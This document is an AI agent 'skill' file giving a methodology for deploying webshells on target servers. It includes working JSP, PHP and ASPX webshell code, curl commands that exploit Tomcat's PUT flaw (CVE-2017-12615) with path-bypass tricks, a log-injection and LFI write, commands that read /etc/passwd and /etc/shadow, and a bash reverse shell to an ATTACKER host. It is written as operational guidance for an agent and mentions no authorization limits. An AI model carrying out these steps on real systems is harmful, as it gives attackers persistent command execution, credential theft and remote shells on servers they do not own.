---
name: webshell-deploy
description: "Webshell deployment and exploitation methodology. Use when exploitation requires uploading or writing a webshell to the target server. Covers JSP/PHP/ASPX webshell generation, HTTP PUT upload (including bypass techniques), file upload forms, log injection + LFI write, and webshell verification and exploitation. Use this skill whenever a file upload vulnerability is found, the PUT method is available, LFI is exploitable, or a persistent command execution entry point must be deployed on the target"
zh-signals: "Webshell 部署与利用方法论，涵盖 JSP/PHP/ASPX 生成、PUT 上传与日志注入写入。信号:Webshell 部署,文件上传,PUT 上传,日志注入,命令执行"
when-to-use: "Use when you have a file upload, PUT method, or LFI opportunity and need to deploy a JSP/PHP/ASPX webshell to gain command execution."
metadata:
  tags: "webshell,upload,jsp,php,aspx,put,file upload,shell,deployment,rce"
  category: "exploit"
---

# Webshell Deployment and Exploitation Methodology


Follow this methodology when exploitation requires uploading or writing a webshell to the target.

## ⛔ Further Reading

- Webshell variants per platform (AV evasion, WAF bypass, platform-compatible versions) → `references/webshell-payloads.md`
- Java in-memory shells (Filter/Servlet/Listener/Agent, fileless) → [references/memory-webshell.md](references/memory-webshell.md)

## Core Principles

1. **Never inline JSP/PHP code in curl -d arguments** — escaping problems corrupt the payload
2. **Write a local file first, then upload with `--data-binary @file`** — guarantees payload integrity
3. **One success is worth more than many attempts** — operate in the correct order and avoid repeated trial and error

---

## Phase 1: Choose the Webshell Type

Select based on the target technology stack:

| Tech Stack | File Type | Upload Path Example |
|--------|---------|-------------|
| Java/Tomcat/JBoss | `.jsp` | `/shell.jsp` |
| PHP/Apache/Nginx | `.php` | `/shell.php` |
| ASP.NET/IIS | `.aspx` | `/shell.aspx` |
| Python/Flask/Django | `.py` | usually not directly uploadable |

## Phase 2: Generate the Webshell File (Locally)

### ⚠️ Key: You must write to a local file

```bash
# ✅ Correct approach: write to a local file
cat > /tmp/shell.jsp << 'EOF'
<%@ page import="java.util.*,java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = br.readLine()) != null) { out.println(line); }
    br = new BufferedReader(new InputStreamReader(p.getErrorStream()));
    while ((line = br.readLine()) != null) { out.println(line); }
}
%>
EOF

# ❌ Wrong approach: inline code in curl -d (escaping problems)
# curl -X PUT url/shell.jsp -d "<%@ page import=\"java.util.*\"..."
# This corrupts the payload because of quote, percent, and angle-bracket escaping
```

### PHP Webshell

```bash
cat > /tmp/shell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = $_REQUEST['cmd'];
    system($cmd);
    echo "</pre>";
}
?>
EOF
```

### ASPX Webshell

```bash
cat > /tmp/shell.aspx << 'EOF'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
if (Request["cmd"] != null) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + Request["cmd"];
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.Start();
    Response.Write("<pre>" + p.StandardOutput.ReadToEnd() + "</pre>");
}
%>
EOF
```

## Phase 3: Upload the Webshell

### Method A: HTTP PUT Upload (Tomcat PUT CVE-2017-12615)

```bash
# Upload the local file with --data-binary (keeps the original content)
# Note: you must use a path bypass technique; a direct PUT to /shell.jsp is rejected

# Bypass 1: trailing slash (Linux)
curl -X PUT "http://TARGET:8080/shell.jsp/" --data-binary @/tmp/shell.jsp -v

# Bypass 2: trailing space %20
curl -X PUT "http://TARGET:8080/shell.jsp%20" --data-binary @/tmp/shell.jsp -v

# Bypass 3: NTFS stream (Windows)
curl -X PUT "http://TARGET:8080/shell.jsp::$DATA" --data-binary @/tmp/shell.jsp -v
```

**Determining upload success**: response code `201 Created` or `204 No Content`.

### Method B: File Upload Form

```bash
curl -X POST "http://TARGET/upload" \
    -F "file=@/tmp/shell.jsp;filename=shell.jsp" \
    -v
```

### Method C: File Inclusion Write

```bash
# Write a webshell via log injection
curl "http://TARGET/" -A '<?php system($_GET["cmd"]); ?>'
# Then include the log file via LFI
curl "http://TARGET/vuln.php?file=/var/log/apache2/access.log&cmd=id"
```

## Phase 4: Verify the Webshell

```bash
# Verify immediately after upload
curl -s "http://TARGET:8080/shell.jsp?cmd=id"

# Expected output: uid=0(root) or similar user information
# If the response is empty/404/500, check:
#   1. Whether the upload path is correct (any bypass changed the suffix)
#   2. Whether the webshell code is complete (check the original file size)
#   3. Whether the target needs a different webshell variant
```

## Phase 5: Exploit the Webshell

```bash
# Basic command execution
curl -s "http://TARGET:8080/shell.jsp?cmd=whoami"
curl -s "http://TARGET:8080/shell.jsp?cmd=uname+-a"
curl -s "http://TARGET:8080/shell.jsp?cmd=cat+/etc/passwd"

# URL-encode spaces and special characters
curl -s "http://TARGET:8080/shell.jsp?cmd=ls%20-la%20/"
curl -s "http://TARGET:8080/shell.jsp?cmd=cat%20/etc/shadow"

# Reverse shell (advanced exploitation)
curl -s "http://TARGET:8080/shell.jsp?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER/4444%200>%261'"
```

## Common Errors and Resolutions

| Problem | Cause | Resolution |
|------|------|------|
| PUT returns 404 | Tomcat rejects a direct PUT of .jsp | Bypass with `/shell.jsp/` or `%20` |
| Webshell returns a blank page | Payload truncated or corrupted by escaping | Check the file size and re-upload with `--data-binary @file` |
| Webshell returns 500 | JSP compilation error | Check the payload syntax, especially quotes and special characters |
| Command produces no output | Used `exec()` instead of shell `-c` | Switch to `new String[]{"/bin/sh", "-c", cmd}` |
| Filename was renamed | The application renamed the uploaded file | Extract the actual filename/path from the response |

## Decision Tree

```
Need a webshell?
├── Does the target support PUT?
│   ├── Yes → Phase 2 write file → Phase 3A PUT upload (try the three bypasses in order)
│   └── No → Is there a file upload feature?
│       ├── Yes → Phase 3B form upload
│       └── No → Is there LFI?
│           ├── Yes → Phase 3C log write + file inclusion
│           └── No → Look for another RCE path
└── Upload successful?
    ├── Yes → Phase 4 verify → Phase 5 exploit
    └── No → Switch bypass → still failing → switch to the shell type for the tech stack
```
